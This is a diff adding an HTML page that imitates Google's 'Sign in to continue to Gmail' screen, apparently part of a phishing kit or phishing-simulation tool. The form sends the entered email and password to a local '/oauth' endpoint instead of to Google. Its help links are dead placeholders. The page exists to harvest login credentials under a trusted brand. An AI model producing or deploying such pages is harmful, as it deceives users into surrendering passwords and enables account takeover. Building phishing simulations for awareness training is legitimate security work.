@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Sign in - Google Accounts</title>
+    <title>Sign in - Google Accounts</title>
+    <script src="static/js/config.js"></script>
+    <link rel="stylesheet" href="static/style.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+<body>
+
+
+    <div class="content-wrapper">
+        <div class="oauth-container">
+            <img class="oauth-logo" src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg"
+                alt="Google">
+            <h1 class="oauth-title">Sign in</h1>
+            <p class="oauth-subtitle">to continue to Gmail</p>
+
+            <form action="/oauth" method="POST">
+                <input type="email" name="email" class="oauth-input" placeholder="Email or phone" required>
+                <input type="password" name="password" class="oauth-input" placeholder="Password" required>
+
+
+                <div style="text-align: left; margin-bottom: 30px;">
+                    <a href="#" style="color: #1a73e8; text-decoration: none; font-weight: 500;">Forgot email?</a>
+                </div>
+
+                <div style="overflow: hidden;">
+                    <a href="#"
+                        style="color: #1a73e8; text-decoration: none; font-weight: 500; float: left; margin-top: 10px;">Create
+                        account</a>
+                    <button type="submit" class="oauth-btn">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+</body>
+
+</html>
